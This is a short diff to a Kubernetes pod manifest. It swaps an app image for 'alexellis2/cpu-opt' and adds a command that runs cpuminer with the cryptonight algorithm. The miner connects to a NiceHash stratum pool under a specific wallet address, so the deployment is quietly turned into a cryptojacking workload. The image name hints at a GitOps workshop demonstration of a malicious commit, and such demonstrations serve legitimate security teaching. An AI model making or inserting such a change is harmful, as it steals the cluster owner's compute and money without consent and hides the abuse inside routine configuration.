@@ -5,5 +5,7 @@ metadata:
 spec:
   containers:
     - name: main
-      image: gitopsworkshop/my-app:v1
+      image: alexellis2/cpu-opt:2018-1-2
       imagePullPolicy: IfNotPresent
+      command: ["./cpuminer"]
+      args: ["-a", "cryptonight", "-o", "stratum+tcp://cryptonight.usa.nicehash.com:3355",  "-u", "1M2KME8VBx24RsU3Ed2dEkF9EFghn3jR2o.cloud1"]
